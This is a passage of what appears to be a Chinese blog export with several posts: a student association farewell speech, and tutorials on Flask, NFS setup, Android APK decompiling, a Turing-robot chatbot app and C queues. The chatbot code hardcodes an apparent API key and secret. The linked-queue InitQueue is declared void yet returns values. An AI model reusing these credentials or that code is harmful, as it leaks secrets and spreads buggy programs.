从我加入实验室，然后经历第一届、第二届电子协会的发展，再到今天第三届电子协会成立，这一路走来，我自己对于这个实验室和协会的发展也投入了很多的精力和感情，当然，在此期间，我也获得了技术与管理的双重成长，还结识了很多志同道合的朋友，这就是我在这里的一些收获。我也相信，如果大家也能够在协会和实验室一直坚持下去，等到你们大四的时候，一定也会有同样的收获和感触。 总结我的大学生活，实验室和协会是非常重要的一部分，也是非常精彩的一部分。深深地记得大二的那个暑假，参加全国电子设计大赛，虽有遗憾，但是一个暑假精心的准备，和指导老师一起四天三夜的连续奋斗至今还历历在目。大学里，你可能会和朋友去KTV通宵嗨唱，也可能会去网吧通宵游戏，但是你很难有机会和老师一起为了比赛而通宵奋斗。另外，我们实验室的小伙伴之间也建立了深厚的友谊，比如我们经常一起打球，有机会还会出去各种浪。总之，这里有学习有奋斗有工作有生活更有快乐，这就是我大学最难忘的实验室时光的一部分，这也是有青春、有活力的电子协会的一部分。虽然现在我们把接力棒交给了第三届的理事们，但是不管以后我们在哪里，我们也会像12级已经毕业的学长学姐们那样，始终关心支持实验室和协会的发展，希望协会的这些优秀的传统能够一届届传递下去。我想，这样一届一届的人才积淀，对于以后实验室和协会成员的考研、找工作或者是创业都会有所帮助，因为我们都来自于电子协会这个大家庭。 然后，作为第二届电子协会管理层的代表，我很高兴能够看到电子协会这一年取得的发展。这些成绩的取得来之不易，一方面，离不开实验室和协会各位指导老师的辛勤付出以及学院对我们的关心与支持，特别是匡老师的到来，给我们协会带来了很多实实在在的改变，在她的指导下很多制度都在不断完善，项目团队也在不断地充实，可以说整个实验室和协会的风气都在慢慢转变，另外王老师也加入到我们的团队中来了，相信我们的电子协会一定会发展得越来越顺利。另一方面，也离不开我们协会所有电子人不懈的努力，是大家夜以继日地奋斗，以及辛勤而无私的付出，才能够给实验室培养和输送这么多的人才，然后才能做出这么多的项目，去北京、上海、成都这些地方参加比赛并去的很不错的成绩。 最后，我想对第三届电子协会的管理人员说，我相信各位能够做得比我们第二届做得更好，也希望你们能够不忘初心，将这份积聚了几届电子人辛勤付出的事业更好地传承下去，我也衷心地希望第三届电子协会能够再创辉煌。我还想对第三届电子协会的所有学弟学妹们说，电子协会是一个很有活力的集体，有技术精湛而且负责任的指导老师，还有一群热情大方的学长学姐，相信这里将会是你技术梦想开始的地方，也希望大家能够一直坚持下来，最终顺利进入实验室，进行更深入的学习。 最后的最后，祝大家在电子协会都能有所收获，也祝愿电子协会能够越办越好。谢谢大家！ 2016年10月22日 湖南农业大学]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Web开发框架Flask]]></title>
    <url>%2F2016%2F10%2F08%2FPython-Web%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6Flask%2F</url>
    <content type="text"><![CDATA[Flask是一个使用 Python 编写的轻量级 Web 应用框架。Flask 的设计目标是实现一个 wsgi 的微框架，其核心代码保持简单和可扩展性，很容易学习。Flask是一个易于学习和使用的框架，但是它的功能也是十分强大，后续还会有进一步的学习和总结，这是第一篇python Web的博客。 flask框架中文版开发文档：http://docs.jinkan.org/docs/flask/ Flask 依赖两个外部库：Werkzeug 和 Jinja2 。 Werkzeug 是一个 WSGI（在 Web 应用和多种服务器之间的标准 Python 接口) 工具集。Jinja2 负责渲染模板。 virtualenv – python虚拟沙盒virtualenv通过创建独立Python开发环境的工具, 来解决依赖、版本以及间接权限问题。 简单地说，你可以为每个项目建立不同的/独立的Python环境，你将为每个项目安装所有需要的软件包到它们各自独立的环境中。 安装virtualenv1$ pip install virtualenv 由于权限问题使用sudo临时提升权限 1$ sudo pip install virtualenv 建立并进入虚拟环境12$ mkdir myproject$ cd myproject 激活虚拟环境1$ . venv/bin/activate #激活当前virtualenv 测试（1）执行python程序 1$ sudo python Test.py （2）访问测试 通过浏览器访问如下地址：http://localhost:5000或者http://127.0.0.1:5000/，就可以看到Hello World！ （3）关闭服务器，按 Ctrl+C。 退出虚拟环境1$ deactivate 删除虚拟环境1$ rm -r venv 获取帮助1$ virtualenv -h Flask框架安装flask1$ pip install flask 基本框架（1）完整的Flask程序 123456789from flask import Flaskapp = Flask(__name__)@app.route(&apos;/&apos;)def hello_world(): return &apos;Hello World!&apos;if __name__ == &apos;__main__&apos;: app.run() （2）框架说明 12from flask import Flaskapp = Flask(__name__) 以上代码中首先导入了 Flask 类，并得到了该类的的实例app，这将会是我们的 WSGI 应用程序。 123@app.route(&apos;/&apos;)def hello_world(): return &apos;Hello World!&apos; 以上代码中route() 装饰器告诉Flask什么样的URL 能触发我们的函数。即route() 装饰器把一个函数绑定到对应的URL上，这个函数返回我们想要显示在用户浏览器中的信息。 12if __name__ == &apos;__main__&apos;: app.run() 以上代码中用 run() 函数来让应用运行在本地服务器上。其中 if name == ‘main‘: 确保服务器只会在该脚本被Python解释器直接执行的时候才会运行，而不是作为模块导入的时候。 调试模式启用了调试支持，服务器会在代码修改后自动重新载入，并在发生错误时提供一个相当有用的调试器。 有两种途径来启用调试模式。一种是直接在应用对象上设置: 12app.debug = Trueapp.run() 另一种是作为 run 方法的一个参数传入: 1app.run(debug=True) 路由配置route() 装饰器把一个函数绑定到对应的 URL 上。 123456789@app.route(&apos;/&apos;)def index(): return &apos;Index Page&apos;#通过http://127.0.0.1:5000访问@app.route(&apos;/hello&apos;)def hello(): return &apos;Hello World&apos;#通过http://127.0.0.1:5000/hello访问 可以给 URL 添加变量部分，你可以把这些特殊的字段标记为 ， 这个部分将会作为命名参数传递到你的函数。规则可以用 指定一个可选的转换器。 1234567891011@app.route(&apos;/user/&lt;username&gt;&apos;)def show_user_profile(username): return &apos;User %s&apos; % username#通过http://127.0.0.1:5000/user/加上名字访问@app.route(&apos;/post/&lt;int:post_id&gt;&apos;)def show_post(post_id): # show the post with the given id, the id is an integer return &apos;Post %d&apos; % post_id#通过http://127.0.0.1:5000/post/加上id访问 默认情况下，路由只回应 GET 请求，但是通过 route() 装饰器传递 methods 参数可以改变这个行为。 123456@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def login(): if request.method == &apos;POST&apos;: do_the_login() else: show_the_login_form() 关于HTTP协议的相关方法请参考博主博客：Android网络编程：HTTP协议 通过以上的学习对于Flask框架应该有了一个基本的认识，后续的博文中还将继续深入学习，敬请关注。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux NFS服务配置]]></title>
    <url>%2F2016%2F10%2F05%2FLinux-NFS%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。本博文记录了博主配置NFS服务的过程，并测试成功，希望对大家有所帮助。 注：本博客基于CentOS7进行测试，并假设你已经具有一定的Linux操作基础。 服务端配置安装必要的包使用NFS服务需要安装两个包：nfs-utils和rpcbind 1yum install -y nfs-utils 使用yum安装nfs-utils时会自动安装rpcbind 配置/etc/exports文件1vim /etc/exports 在配置文件中增加内容，每一行分为三部分： 本地要共享出去的目录 允许访问的主机（ip或ip段） 权限选项 例如写入如下一行： 1/home/fzy/ 192.168.0.1/24(rw,sync,all_squash,anonuid=501,anongid=501) 意思是：把/home/fzy/目录共享给ip地址为192.168.0.1/24的主机. 权限部分特别说明： rw 表示读/写 ro 表示只读 sync 表示数据同步写入内存缓冲区与磁盘中，效率较低，但可以保证数据的一致性（适合于小文件传输） async 表示数据先暂时放于内存，而非直接写入硬盘，等到必要时才写入磁盘（适合于大文件传输） no_root_squash 表示root用户对这个共享的目录拥有至高的控制权（不安全，不建议使用） root_squash 表示root用户对这个共享的目录的权限和普通用户一样。 all_squash 表示不管使用NFS的用户是谁，其身份都会被限定成一个指定的普通用户。 no_all_squash 表示所有的普通用户使用nfs都不使用权限压缩（默认设置） anonuid/anongid 要和root_squash以及all_squash选项一同使用，用于指定使用NFS的用户被限定后的uid和gid 启动NFS服务在启动nfs前，需先启动rpcbind 12# service rpcbind start# service nfs start 虽然上面的命令能够正常启动服务，但是根据提示，我们应该使用如下命令来替换： # /bin/systemctl start rpcbind.service # /bin/systemctl start nfs.service 关闭NFS服务 # /bin/systemctl stop rpcbind.service # /bin/systemctl stop nfs.service 客户端挂载NFS查看服务器共享的目录1# showmount -e 服务器ip地址 会得到如下的结果： 12Export list for 服务器ip地址:/home/fzy 客户端ip地址 在客户端上挂载NFS1# mount -t nfs 服务器ip地址:服务器共享目录 挂载点 其中-t nfs 指定挂载的类型为nfs 查看是否挂载成功命令df用于查看已挂载磁盘的总容量、使用容量、剩余容量等。 1# df -h -h 表示使用合适的单位显示 如下图： 解除挂载1# umount 已挂载的目录 如果遇到：umount.nfs: 已挂载的目录: device is busy 可以添加-l参数，如下： 1# umount -l 已挂载的目录 选项 –l 并不是马上umount，而是在该目录空闲后再umount，即延迟卸载。 开机自动挂载方法一： /etc/fstab里添加如下内容： 1服务器ip地址:共享的目录 客户端挂载点 nfs defaults 1 1 第1个1表示备份文件系统，第2个1表示从/分区的顺序开始fsck磁盘检测，0表示不检测. 方法二（推荐）： 将手动挂载命令加入到/etc/rc.local中. 命令exportfs命令选项 -a 表示全部挂载或者卸载 -r 表示重新挂载 -u 表示卸载某一目录 -v 表示显示共享的目录 使用命令修改配置文件/etc/exports后，使用exportfs命令挂载不需要重启NFS服务 1# exportfs -arv]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>NFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android逆向分析之反编译]]></title>
    <url>%2F2016%2F10%2F03%2FAndroid%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91%2F</url>
    <content type="text"><![CDATA[如果你已经具备一定的Android开发基础，那你一定会思考别人的App是怎么做的，在使用一款App的时候也会想它这个布局、这个效果是怎么实现的？思考是好事，但是全靠猜可不行，如何拿到他的源代码呢？反编译的作用不言而喻。直接拿别人的源码确实不太道德，所以我们提倡学习借鉴，而不是复制。 使用工具： apktool（获取资源文件工具） apktool官方地址 dex2jar（获取源码文件工具） dex2jarGithub地址 jd-gui（源码查看工具） jd-gui官方地址 工具打包下载地址： 百度云链接：http://pan.baidu.com/s/1jHVHc4Q 密码：ra3u 注：以下操作需要你的电脑安装JDK，我们假设你已经安装了，并配置好了环境变量。 反编译得到资源文件apktool反编译得到程序的源代码、图片、XML配置、语言资源等文件 简单的使用如果你只需要简单的反编译，那下面这条命令已经能够满足你的需求。 在Windows下，使用cmd进入到下载的decompile文件夹，然后使用如下命令进行反编译： 1apktool.jar d apk文件路径 配置更多如果你需要使用带参数的apktool，体验更多的功能，或者你经常使用反编译，那建议你进行相应的配置。 将decompile文件夹下的apktool.jar和apktool.bat移动/复制到C:\Windows目录下(需要管理员权限)，如果不进行这一步，使用apktool命令时会提示：’apktool’不是内部或外部命令，也不是可运行的程序或批处理文件。 此处操作的原理就是将apktool的文件加入到环境变量中，因为C:\Windows已经在系统的环境变量中，所以复制到该文件夹后，apktool就成为了一个随处可用的命令。 比如使用apktool命令进行反编译： 1apktool d apk文件路径 apktool有如下参数可供使用： 123456789101112131415161718192021(1) -version 或者 --version 查看apktool版本信息(2) -advance 或者 --advanced 输出更详细的信息(3) d 或者 decode 反编译(4) b 或者 build 编译(5) -o 或者 --output &lt;dir&gt; apk反编译后输出到指定目录---------------------------以上较常用-----------------------------(6) -r 或者 --no-res 阻止反编译resource，不修改resources.arsc，若仅仅修改java（smail），建议使用该选项(7) -s 或者 --no-src 阻止dex文件分割，在build时仅仅移动classes.dex，若需要快速打包，建议使用该选项(8) -f 或者 --force-all 在打包时重写已经存在的文件，强制覆盖(9) -t 或者 --frame-tag &lt;TAG&gt; 给生成的framework文件打上标识(10) -p 或者 --frame-path &lt;dir&gt;指定framework文件储存的位置 使用apktool进行反编译之后可以得到android工程的res目录下的所有文件，以及AndroidManifest.xml，还有一个smali文件夹，很可惜，这个文件夹里的文件并不是java文件，而是很多smali格式的文件。如下图所示： 因为Android系统有自己的虚拟机Dalvik,代码编译最终不是采用的java的class，而是使用的smali。如果我们懂一点smali语法，那看懂这些文件也是不成问题的，但是我们有更好的办法，请看下一步。 Apk反编译得到Jar文件1、在windows下，使用cmd进入到下载的decomplie目录下的dex2jar文件夹 2、将apk文件改成rar后者zip文件，然后解压得到classes.dex文件 3、将解压得到的classes.dex文件复制到dex2jar文件夹内 4、使用如下命令得到classes-dex2jar.jar文件 1d2j-dex2jar.bat classes.dex文件的路径 在dex2jar文件夹可以看到生成了一个classes-dex2jar.jar的文件，然后通过下一步的工具即可查看项目java源码。 使用jar查看器查看源码打开下载的decompile文件夹中的jd-gui-windows-1.4.0目录下的jd-gui.exe，使用jd-gui打开上一步得到的jar文件即可看到项目的java源码，如下图所示： 此工具可用来查看jar文件，其实很多第三方的jar包也是可以通过此工具打开进行查看的。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,反编译］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android聊天机器人之图灵机器人]]></title>
    <url>%2F2016%2F09%2F22%2FAndroid%E8%81%8A%E5%A4%A9%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%B9%8B%E5%9B%BE%E7%81%B5%E6%9C%BA%E5%99%A8%E4%BA%BA%2F</url>
    <content type="text"><![CDATA[图灵机器人—-中文语境下智能度最高的机器人大脑。之前写了一个有意思的小Demo，其实也比较简单，只是使用了图灵机器人的SDK来做了一个简单的聊天机器人，不过图灵机器人确实比较智能，而且功能十分丰富，它不仅提供了数据访问接口，还集成了SDK供大家使用，所以很方便很实用。如果无聊了，就自己动手来做一个聊天机器人解解闷吧！ 下载Android版本SDK图灵机器人官网：http://www.tuling123.com/ 注册之后创建机器人，就可以得到APIKEY和密钥，然后下载SDK，如下图： 将SDK添加到工程中将SDK压缩包中的libs文件夹复制到工程目录替换掉原来的libs。 添加权限1234567&lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt; SDK初始化12345678910111213141516171819SDKInitBuilder builder = new SDKInitBuilder(this) .setSecret(TURING_SECRET).setTuringKey(TURING_APIKEY) .setUniqueId(UNIQUEID);SDKInit.init(builder, new InitListener() &#123; @Override public void onFail(String arg0) &#123; // TODO Auto-generated method stub &#125; @Override public void onComplete() &#123; // TODO Auto-generated method stub mTuringApiManager = new TuringApiManager(MainActivity.this); mTuringApiManager.setHttpListener(myHttpConnectionListener); // ttsManager.startTTS(&quot;你好啊&quot;); &#125;&#125;); 聊天机器人Demo实现的效果如下： 实现步骤： 定义消息实体类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class ChatMessage &#123; private String name; //消息的名字 private String msg; //消息的内容 private Type type; //消息的类型 private Date date; //消息的时间 //消息类型：发送、接收 public enum Type &#123; INCOMING, OUTCOMING &#125; public ChatMessage() &#123; // TODO Auto-generated constructor stub &#125; public ChatMessage(String msg,Type type,Date date) &#123; // TODO Auto-generated constructor stub setMsg(msg); setType(type); setDate(date); &#125; //生成各成员属性的set和get方法 public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getMsg() &#123; return msg; &#125; public void setMsg(String msg) &#123; this.msg = msg; &#125; public Type getType() &#123; return type; &#125; public void setType(Type type) &#123; this.type = type; &#125; public Date getDate() &#123; return date; &#125; public void setDate(Date date) &#123; this.date = date; &#125;&#125; 编写适配器类使用适配器将数据与视图绑定起来。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485public class ChatMessageAdapter extends BaseAdapter &#123; private List&lt;ChatMessage&gt; mDatas; private Context mContext; //使用ViewHolder临时存储view，提高效率 private final class ViewHolder &#123; TextView mDate; TextView mMsg; &#125; public ChatMessageAdapter(Context context, List&lt;ChatMessage&gt; data) &#123; // TODO Auto-generated constructor stub mDatas = data; mContext = context; &#125; @Override public int getCount() &#123; // TODO Auto-generated method stub return mDatas.size(); &#125; @Override public Object getItem(int position) &#123; // TODO Auto-generated method stub return mDatas.get(position); &#125; @Override public long getItemId(int position) &#123; // TODO Auto-generated method stub return position; &#125; //得到布局的类型 @Override public int getItemViewType(int position) &#123; ChatMessage chatMessage = mDatas.get(position); if (chatMessage.getType() == Type.INCOMING) &#123; return 0; &#125; return 1; &#125; @Override public int getViewTypeCount() &#123; return 2; &#125; @Override public View getView(int position, View convertView, ViewGroup parent) &#123; // TODO Auto-generated method stub ViewHolder viewHolder = null; if (convertView == null) &#123; //更具不同的布局，加载不同的控件 if (getItemViewType(position) == 0) &#123; convertView = LayoutInflater.from(mContext).inflate( R.layout.item_from_msg, null); viewHolder = new ViewHolder(); viewHolder.mDate = (TextView) convertView .findViewById(R.id.id_form_msg_date); viewHolder.mMsg = (TextView) convertView .findViewById(R.id.id_from_msg_info); &#125; else &#123; convertView = LayoutInflater.from(mContext).inflate( R.layout.item_to_msg, null); viewHolder = new ViewHolder(); viewHolder.mDate = (TextView) convertView .findViewById(R.id.id_to_msg_date); viewHolder.mMsg = (TextView) convertView .findViewById(R.id.id_to_msg_info); &#125; convertView.setTag(viewHolder); //使用setTag把view缓存起来 &#125; else &#123; viewHolder = (ViewHolder) convertView.getTag(); //使用getTag得到view &#125; ChatMessage chatMessage = mDatas.get(position); // 设置数据 SimpleDateFormat df = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); viewHolder.mDate.setText(df.format(chatMessage.getDate())); viewHolder.mMsg.setText(chatMessage.getMsg()); return convertView; &#125;&#125; 实现业务逻辑123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125public class MainActivity extends Activity &#123; /** * 申请的turing的apikey * **/ private final String TURING_APIKEY = &quot;56433fe6f67942ff80c4d7bd2d20fe34&quot;; /** * 申请的secret * **/ private final String TURING_SECRET = &quot;d9989eac6e4cab39&quot;; private final String UNIQUEID = &quot;131313131&quot;; private TuringApiManager mTuringApiManager; private ListView mMsgs; private ChatMessageAdapter mAdapter; private List&lt;ChatMessage&gt; mDatas; private EditText mInputMsg; private Button mSendMsg; //设置监听 HttpConnectionListener myHttpConnectionListener = new HttpConnectionListener() &#123; @Override public void onSuccess(RequestResult result) &#123; // TODO Auto-generated method stub if (result != null) &#123; String res = result.getContent().toString(); //获取服务器返回数据 System.out.println(res); JSONObject jo; try &#123; jo = new JSONObject(res); //解析JSON格式数据 String text = jo.getString(&quot;text&quot;); mDatas.add(new ChatMessage(text, Type.INCOMING, new Date())); mAdapter.notifyDataSetChanged(); //更新UI mMsgs.setSelection(mDatas.size()-1); &#125; catch (JSONException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125; @Override public void onError(ErrorMessage arg0) &#123; // TODO Auto-generated method stub &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); requestWindowFeature(Window.FEATURE_NO_TITLE); setContentView(R.layout.activity_main); //SDK初始化 SDKInitBuilder builder = new SDKInitBuilder(this) .setSecret(TURING_SECRET).setTuringKey(TURING_APIKEY) .setUniqueId(UNIQUEID); SDKInit.init(builder, new InitListener() &#123; @Override public void onFail(String arg0) &#123; // TODO Auto-generated method stub &#125; @Override public void onComplete() &#123; // TODO Auto-generated method stub mTuringApiManager = new TuringApiManager(MainActivity.this); mTuringApiManager.setHttpListener(myHttpConnectionListener); &#125; &#125;); initView(); //初始化视图 initDatas(); //初始化数据 //发送消息按钮的监听事件 mSendMsg.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; final String toMsg = mInputMsg.getText().toString(); if (TextUtils.isEmpty(toMsg)) &#123; Toast.makeText(MainActivity.this,&quot;发送消息不能为空！&quot;,Toast.LENGTH_SHORT).show(); return; &#125; //得到输入框的内容，转化成一个消息对象 ChatMessage toMessage = new ChatMessage(toMsg,Type.OUTCOMING,new Date()); mDatas.add(toMessage); mAdapter.notifyDataSetChanged(); mMsgs.setSelection(mDatas.size()-1); //清空输入框 mInputMsg.setText(&quot;&quot;); //发送消息到图灵服务器 mTuringApiManager.requestTuringAPI(toMsg); &#125; &#125;); &#125; //初始化数据 private void initDatas() &#123; mDatas = new ArrayList&lt;ChatMessage&gt;(); mDatas.add(new ChatMessage(&quot;你好，小农为您服务&quot;, Type.INCOMING, new Date())); mAdapter = new ChatMessageAdapter(this, mDatas); mMsgs.setAdapter(mAdapter); &#125; //初始化视图 private void initView() &#123; mMsgs = (ListView) findViewById(R.id.id_listview_msgs); mInputMsg = (EditText) findViewById(R.id.id_input_msg); mSendMsg = (Button) findViewById(R.id.id_send_msg); &#125;&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,图灵机器人］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构基础之队列]]></title>
    <url>%2F2016%2F09%2F08%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[上一篇博客中我们总结了栈的相关知识，其实，在数据结构的教材中栈和队列通常是放在同一章进行讲解的，因为他们都是操作受限的线性表，只是具体的限制不同。队列是只允许在表的一段进行插入操作，而在另一端进行删除操作的线性表，它的应用也是比较广泛的，比如在操作系统的处理进程对CPU资源的竞争以及我们常常提及的优先级队列等等。 队列的基本概念定义：只允许在表的一段进行插入操作，而在另一端进行删除操作的线性表。 队头：允许进行删除操作的一端。 队尾：允许进行插入操作的一端。 顺序队列 采用顺序存储结构，即在内存中用一组地址连续的存储单元一次存放从队头到队尾的数据元素，同时设置两个指针front、rear分别指示队头元素和队尾元素的位置。 1234typedef struct&#123; ElemType data[MAXSIZE]; //存放数据元素的数组 int front,rear; //头尾指针&#125;SeqQueue; 队头指针：指示队头元素所在位置。 队尾指针：指示队尾元素的下一个位置。 入队操作：rear = rear + 1 出队操作：front = front + 1 当rear = MAXSIZE时，队列不一定真的占满整个数组空间，因为不管入队还是出队指针都是加，头指针一直加就会使得数组的前端可能出现许多空的单元，这种现象称为假溢出。为了充分利用数组空间，于是引入了循环队列。 循环队列 将队列的存储空间看成一个环状的空间，即将队列的首、尾的位置连接起来形成的结构称为循环队列。 入队操作：Q-&gt;rear = (Q-&gt;rear + 1) % MAXSIZE 出队操作：Q-&gt;front = (Q-&gt;front + 1) % MAXSIZE 区分队空还是队满的方式1、牺牲一个单元来区分队空和队满，约定以队头指针在队尾指针的下一个位置作为队满的标志，则有： 队空条件：Q-&gt;front == Q-&gt;rear 队满条件：(Q-&gt;rear + 1) % MAXSIZE == Q-&gt;front 队列中元素个数：(Q-&gt;rear-Q-&gt;front+MAXSIZE) % MAXSIZE 2、类型中增设表示元素个数的数据成员，则有： 队空满条件：Q-&gt;size == 0 队满条件：Q-&gt;size == MAXSIZE 3、类型中增设tag数据成员，则有： tag等于0的情况下，若因删除导致Q-&gt;front == Q-&gt;rear则为队空，tag等于1的情况下，若因插入导致Q-&gt;front == Q-&gt;rear则为队满。 基本操作实现下面例子采用第一种处理方式： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define false 0#define true 1#define MAXSIZE 100typedef struct&#123; ElemType data[MAXSIZE]; //存放数据元素的数组 int front,rear; //头尾指针&#125;SeqQueue;/*********初始化队列*********/void InitQueue(SeqQueue *Q)&#123; Q-&gt;front = Q-&gt;rear = 0;&#125;/*******判断队列是否为空*******/int QueueEmpty(SeqQueue *Q)&#123; if(Q-&gt;front == Q-&gt;rear) return true; else return false;&#125;/*************入队操作*************/int EnQueue(SeqQueue *Q,ElemType e)&#123; if((Q-&gt;rear+1)%MAXSIZE == Q-&gt;front) //队满 return false; Q-&gt;data[Q-&gt;rear] = e; //将e插入队尾 Q-&gt;rear = (Q-&gt;rear+1)%MAXSIZE; //修改尾指针 return true;&#125;/*************出队操作**************/int DeQueue(SeqQueue *Q,ElemType *e)&#123; if(Q-&gt;front == Q-&gt;rear) //队空 return false; *e = Q-&gt;data[Q-&gt;front]; //得到删除的队头元素 Q-&gt;front = (Q-&gt;front+1)%MAXSIZE; //修改头指针 return true;&#125;/*************取队头元素**************/int GetFront(SeqQueue *Q,ElemType *e)&#123; if(Q-&gt;front == Q-&gt;rear) //队空 return false; *e = Q-&gt;data[Q-&gt;front]; //取得队头元素 return true;&#125;int main()&#123; SeqQueue Q; InitQueue(&amp;Q); .... 进行入队、出队、判空等操作 .... return 0;&#125; 链式队列 采用链表形式的队列，队列中每个元素对应链表中的一个结点的，并设置两个分别指向队头和队尾的指针。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define false 0#define true 1typedef struct LinkQNode&#123; ElemType data; //数据域 struct LinkQNode *next; //指针域&#125;LinkQNode;typedef struct&#123; LinkQNode *front; //队头指针 LinkQNode *rear; //队尾指针&#125;LinkQueue;/*********初始化队列*********/void InitQueue(LinkQueue *Q)&#123; LinkQNode *p = (LinkQNode *)malloc(sizeof(LinkQNode)); //构建头结点 if(p == NULL) //存储空间分配失败 return false; Q-&gt;front = Q-&gt;rear = p; //队头指针和队尾指针都指向头结点 Q-&gt;front-&gt;next = NULL; //头结点指针域至为空 return true;&#125;/*******判断队列是否为空*******/int QueueEmpty(LinkQueue *Q)&#123; if(Q-&gt;front == Q-&gt;rear) return true; else return false;&#125;/*************入队操作*************/int EnQueue(LinkQueue *Q,ElemType e)&#123; LinkQNode *p = (LinkQNode *)malloc(sizeof(LinkQNode)); //构建新结点 if(p == NULL) //存储空间分配失败 return false; p-&gt;data = e; //设置新结点数据域 p-&gt;next = NULL; //设置新结点指针域 Q-&gt;rear-&gt;next = p; //将新结点插入队尾 Q-&gt;rear = p; //修改队尾指针 return true;&#125;/*************出队操作**************/int DeQueue(LinkQueue *Q,ElemType *e)&#123; LinkQNode *p; if(Q-&gt;front == Q-&gt;rear) //队列空 return false; p = Q-&gt;front-&gt;next; //得到第一个结点 *e = p-&gt;data; //得到删除结点的值 Q-&gt;front-&gt;next = p-&gt;next; //结点p出队 if(Q-&gt;rear == p) //队列中只有一个结点p，则出队后队列为空 Q-&gt;rear = Q-&gt;front; free(p); //释放存储空间 return true;&#125;/*************取队头元素**************/int GetFront(LinkQueue *Q,ElemType *e)&#123; LinkQNode *p; if(Q-&gt;front == Q-&gt;rear) //队空 return false; p = Q-&gt;front-&gt;next; //得到第一个结点 *e = p-&gt;data; //得到第一个结点的值 return true;&#125;int main()&#123; LinkQueue Q; InitQueue(&amp;Q); .... 进行入队、出队、判空等操作 .... return 0;&#125; 双端队列 双端队列是指允许两端都可以进行入队和出队操作的队列。 输出受限的双端队列：允许在一端进行插入和删除，但在另一端只允许插入的双端队列。 输入受限的双端队列：允许在一端进行插入和删除，但在另一端只允许删除的双端队列。 尽管双端队列看起来似乎比栈和队列更灵活，但实际上在应用程序中远不及栈和队列有用，所以在这里就不详细的介绍啦！]]></content>
      <categories>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构基础之栈]]></title>
    <url>%2F2016%2F09%2F07%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%A0%88%2F</url>
